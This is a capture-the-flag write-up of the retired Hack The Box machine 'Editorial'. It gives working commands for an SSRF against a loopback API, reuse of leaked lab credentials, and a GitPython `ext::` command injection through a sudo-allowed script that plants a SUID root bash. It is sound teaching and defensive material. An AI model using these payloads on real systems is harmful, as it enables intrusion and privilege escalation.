---
title: "Hack The Box — Editorial"
summary: "Editorial's cover preview exposes an internal API through SSRF; leaked dev credentials, Git history and a sudo-allowed GitPython clone lead to root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-11-09
publishedAt: 2026-11-09
tags:
  - ssrf
  - internal-api
  - credential-disclosure
  - git-history
  - sudo
  - gitpython
  - privilege-escalation
tools:
  - Nmap
  - Burp Suite
  - curl
  - Git
  - SSH
cves:
  - CVE-2022-24439
htbUrl: "https://app.hackthebox.com/machines/608"
cover: "/images/writeups/hackthebox/machines/editorial/editorial.png"
coverAlt: "Hack The Box Editorial machine logo showing a stack of books inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official Editorial page](https://www.hackthebox.com/machines/Editorial) identifies it as a **Retired Machine**. Flag values and personal VPN addresses are omitted. The credentials below belong to this retired lab and are needed to reproduce the attack path.

## Executive summary

Editorial exposes a book submission form whose cover preview fetches a user-supplied URL. Pointing it at an API bound to the target's loopback interface makes the web server store the API response in a temporary preview file. The API leaks credentials for `dev`, which provide SSH access. A Git repository in `dev`'s home directory retains an earlier `prod` password in a commit diff. As `prod`, a `sudo` rule permits running a Python clone script as root. The script passes a controllable URL to vulnerable GitPython 3.1.29 and explicitly enables Git's `ext` protocol, allowing a root-owned helper command to execute.

## Target information

| Item | Value |
| --- | --- |
| Target | Editorial (`editorial.htb`) |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Linux |
| Publication policy | Retired, confirmed by the [official machine page](https://www.hackthebox.com/machines/Editorial) |
| Solved | 9 November 2026 |
| Main weaknesses | SSRF in cover preview, credentials exposed by an internal API and Git history, unsafe privileged GitPython clone |

HTB assigns a target address to each lab session. Replace the placeholder with the IP displayed in your own machine panel:

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
echo "$TARGET_IP editorial.htb" | sudo tee -a /etc/hosts
```

## Enumeration

I scanned all TCP ports with service and default-script detection:

```bash
nmap "$TARGET_IP" -sVC -p-
```

The scan found two open ports:

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

The HTTP service redirected to `http://editorial.htb`, which is why the hosts-file entry matters. SSH was available, but there were no credentials yet. The website's `/upload` page contained a book submission form with a **Cover URL related to your book** field and a **Preview** button. Previewing a remote image was the first feature worth testing: the server might fetch the supplied URL rather than leaving that request to the browser.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| HTTP redirected to `editorial.htb` | The virtual host needed to resolve before exploring the site. |
| `/upload` accepted a cover URL | A user-controlled fetch could reach hosts unavailable from the attacker machine. |
| Preview sent `POST /upload-cover` | It isolated the server-side request from the final book-submission form. |
| The preview response was a `static/uploads/...` path | The fetched content could be read through a second HTTP request. |

## Initial access

### Inspecting the cover preview request

Using Burp Suite's HTTP history or Repeater, pressing **Preview** produced a multipart request to `/upload-cover`. The relevant form parts were `bookurl` and an empty `bookfile`:

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data; boundary=...

... name="bookurl"

http://127.0.0.1:5000/
... name="bookfile"; filename=""
```

The loopback address is resolved **on Editorial**, because its web application performs the fetch. Port 5000 is not exposed in the external Nmap scan. The response to this preview request was a path like `static/uploads/<generated-id>`, not the fetched content itself.

The following commands reproduce the request and immediately read the generated file. Use `preview_path`, not `path`: in Kali's default zsh, `path` is a special variable tied to `PATH`.

```bash
preview_path=$(curl -sS http://editorial.htb/upload-cover \
  -F 'bookurl=http://127.0.0.1:5000/' \
  -F 'bookfile=@/dev/null;filename=')

printf 'Preview path: %s\n' "$preview_path"
curl -sS "http://editorial.htb/${preview_path#/}" | python3 -m json.tool
```

The saved response was JSON. Its `messages` section listed endpoints for promotions, coupons, new authors and platform usage, including:

```json
{
  "messages": [
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    }
  ]
}
```

The `authors` endpoint was the most promising lead because a welcome message can contain account setup information. I sent a second preview request to that internal path, then read its temporary output immediately:

```bash
preview_path=$(curl -sS http://editorial.htb/upload-cover \
  -F 'bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors' \
  -F 'bookfile=@/dev/null;filename=')

curl -sS "http://editorial.htb/${preview_path#/}" | python3 -m json.tool
```

The `template_mail_message` contained credentials for `dev`:

```text
Username: dev
Password: dev080217_devAPI!@
```

This is an SSRF-assisted credential disclosure, rather than direct remote code execution through the website. The web app could reach a loopback-only service and made its response available to us as a preview file.

### SSH access and the user flag

I logged in with the exposed lab credentials, typing the password at the SSH prompt:

```bash
ssh dev@"$TARGET_IP"
```

The session reported `uid=1001(dev)`. The user flag was in `/home/dev/user.txt`; its value is intentionally omitted:

```bash
whoami
id
ls -la /home/dev
cat /home/dev/user.txt
```

## Privilege escalation

### Recovering `prod` credentials from Git history

Enumerating `dev`'s home directory revealed `/home/dev/apps/.git`:

```bash
find /home -maxdepth 4 -type d -name .git 2>/dev/null
git -C /home/dev/apps log --oneline --all --decorate
```

The history included commit `b73481b` (`change(api): downgrading prod to dev`). To avoid scrolling through bundled CSS and other unrelated changes, I inspected that commit's API file directly:

```bash
git -C /home/dev/apps show b73481b -- app_api/app.py
```

The diff replaced an earlier welcome message for `prod` with the `dev` message. Both messages are long string literals containing escaped `\n` characters; the relevant contents are:

```text
Removed message: Username: prod / Password: 080217_Producti0n_2023!@
Added message:   Username: dev  / Password: dev080217_devAPI!@
```

In `Producti0n`, the character before `n` is the digit zero. I used `su` from the existing SSH session and entered the recovered password at the prompt:

```bash
su - prod
whoami
id
```

This yielded `uid=1000(prod)`. A deleted line in Git is still accessible to anyone who can read the repository history; changing the current file does not remove the secret from earlier commits.

### Inspecting the privileged clone script

As `prod`, `sudo -l` allowed one root command with arbitrary trailing arguments:

```bash
sudo -l
```

```text
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

I read the script and checked the GitPython version used by `/usr/bin/python3`:

```bash
sed -n '1,240p' /opt/internal_apps/clone_changes/clone_prod_change.py
/usr/bin/python3 -c 'import git; print(git.__version__)'
```

```python
import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')
url_to_clone = sys.argv[1]
r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

GitPython reported `3.1.29`, an affected version of [CVE-2022-24439](https://github.com/advisories/GHSA-hcpj-qp55-gfph). The failure is at the trust boundary: `prod` controls `sys.argv[1]`, but the root-owned script passes it to `clone_from()` and explicitly enables `protocol.ext.allow=always`. Git's [`ext::` remote helper](https://git-scm.com/docs/git-remote-ext) treats the URL as an external command. In that syntax, `% ` represents a literal space within an argument.

I first used a harmless marker to verify the command ran as root:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \
  'ext::sh -c touch% /tmp/editorial-root-proof'

ls -l /tmp/editorial-root-proof
```

The file was owned by `root`. The Python script raised `GitCommandError` because `touch` does not speak the Git transport protocol, but the side effect had already happened. A clone error therefore did **not** mean the payload failed.

For an interactive root shell, I used the same path to install a temporary root-owned copy of Bash with its SUID bit set:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \
  'ext::sh -c install% -m% 4755% /bin/bash% /tmp/editorial-rootbash'

ls -l /tmp/editorial-rootbash
/tmp/editorial-rootbash -p
id
cat /root/root.txt
```

The installed file had mode `-rwsr-xr-x` and was owned by `root`. Bash's `-p` preserved the effective UID; `id` confirmed root and the root flag was readable. The flag value is omitted. After finishing the lab, the temporary files can be removed from the root shell:

```bash
rm -f /tmp/editorial-root-proof /tmp/editorial-rootbash
```

## What did not work

- A preview file returned `404 Not Found` when fetched about a minute after creation. Repeating the POST and immediately requesting the new `static/uploads/...` path returned the API JSON. Each preview generates a fresh path, so do not reuse an old one.
- Assigning the preview path to a variable named `path` in zsh broke command lookup because zsh ties `path` to `PATH`. Restoring `PATH` and using `preview_path` resolved it.
- The malicious clone returned a Git error even when the command executed. The root-owned marker file and later `id` output were the evidence of success.

## Attack path

1. Nmap found SSH and an HTTP virtual host at `editorial.htb`.
2. The cover preview fetched a loopback URL and exposed the internal API response through a temporary upload path.
3. The API's author welcome message leaked `dev` credentials, enabling SSH.
4. A Git commit diff in `/home/dev/apps` leaked earlier `prod` credentials.
5. A root-run clone script accepted a controlled URL; GitPython 3.1.29 and the enabled `ext::` helper yielded root command execution.

## Lessons learned

- A URL preview feature must restrict destinations after DNS resolution, block loopback and private addresses, and control redirects. Storing fetched responses under a public path can turn a blind SSRF into a readable one.
- Never place live credentials in application responses or Git history. Rotate exposed passwords; deleting them from the current file does not revoke them.
- A narrowly named `sudo` command is still dangerous when it accepts attacker-controlled arguments. In this case, the root script enabled Git's external transport and forwarded an untrusted clone URL to an affected GitPython version. Restrict the input and avoid granting this script root execution.
- Validate each step with its own evidence: API JSON for SSRF, a real SSH session for credential reuse, and a root-owned marker plus `id` for privilege escalation.

## References

- [Hack The Box — Editorial (Retired Machine)](https://www.hackthebox.com/machines/Editorial)
- [GitHub advisory for CVE-2022-24439](https://github.com/advisories/GHSA-hcpj-qp55-gfph)
- [GitPython upstream issue for CVE-2022-24439](https://github.com/gitpython-developers/GitPython/issues/1515)
- [Git `remote-ext` documentation](https://git-scm.com/docs/git-remote-ext)
